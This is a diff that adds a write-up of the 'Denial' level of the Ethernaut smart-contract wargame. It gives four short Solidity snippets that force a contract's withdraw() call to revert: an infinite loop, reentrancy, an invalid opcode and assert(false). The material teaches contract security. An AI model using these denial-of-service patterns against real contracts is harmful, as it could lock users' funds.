@@ -1321,3 +1321,68 @@ challenge.revise(offset, bytes32(uint256(uint160(address(this)))));
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/1c8df659b98177b737fd8af411b30bf24c1cbef1/contracts/access/Ownable.sol#L21
 * https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html#mappings-and-dynamic-arrays
 * https://solidity-by-example.org/hacks/overflow/
+
+## 20 Denial
+
+To beat this level, we need to comply with
+
+```solidity
+if (address(instance).balance <= 100 wei) { // cheating otherwise
+    return false;
+}
+
+// fix the gas limit for this call
+(bool result,) = address(instance).call{gas:1000000}(abi.encodeWithSignature("withdraw()")); // Must revert
+return !result;
+```
+
+In other words, we got to prevent the instance to have their funds withdrawn by making the function revert, but we can't just empty the level contract.
+
+### Solution 1 - Infinite Loop
+
+An infinite loop will just consume all the gas, reverting the transaction.
+
+```solidity
+// infinite loop
+// "EvmError: OutOfGas"
+while (true) {}
+```
+
+### Solution 2 - Reentrancy Attack
+
+When your attacking contract receives payment, call `withdraw()` again
+
+```solidity
+// reentrancy attack
+// "EvmError: OutOfGas"
+challenge.withdraw();
+```
+
+### Solution 3 - Invalid Opcode
+
+Just issue an invalid opcode to revert
+
+```solidity
+// invalid opcode
+// "EvmError: InvalidOpcode"
+assembly { invalid() }
+```
+
+### Solution 4 - OOG with `assert(false)`
+
+`assert(false)` will consume all the remaining gas in the transaction.
+
+For some reason is not working in Solidity 0.8.18, though. See [here](https://ethereum.stackexchange.com/a/113362) for some insights/
+
+```solidity
+// consume all the gas with an assert(false)
+// for some reason is not working in solidity > 0.8.5
+//   see this link
+//   https://ethereum.stackexchange.com/a/113362
+assert(false);
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.17/control-structures.html#error-handling-assert-require-revert-and-exceptions
+* https://ethereum.stackexchange.com/a/113362
